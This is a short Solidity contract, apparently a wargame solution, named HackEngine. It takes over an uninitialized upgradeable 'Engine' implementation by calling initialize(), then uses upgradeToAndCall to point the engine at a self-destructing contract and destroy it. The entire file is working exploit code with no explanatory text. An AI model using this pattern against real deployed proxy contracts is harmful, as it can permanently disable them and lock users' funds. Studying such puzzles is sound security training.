// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "./Engine.sol";
import "./SelfDestructor.sol";

contract HackEngine {
    // create an engine object to be able to call functions on
    Engine public engine;

    constructor(address _engineAddress) {
        engine = Engine(_engineAddress);
    }
     
    function attackEngine() external  {
        (bool success, bytes memory data) = address(engine).call(abi.encodeWithSignature('initialize()'));
    }
    
    function destroyWithSelfDesctructor() external {
        // pass in a bomb which blows up when initialize is called
        SelfDestructor sd = new SelfDestructor();
        
        (bool success, bytes memory data) =  address(engine).call(
            abi.encodeWithSignature('upgradeToAndCall(address,bytes)',
            address(sd), 
            abi.encodeWithSignature("initialize()"))
        );
    }
}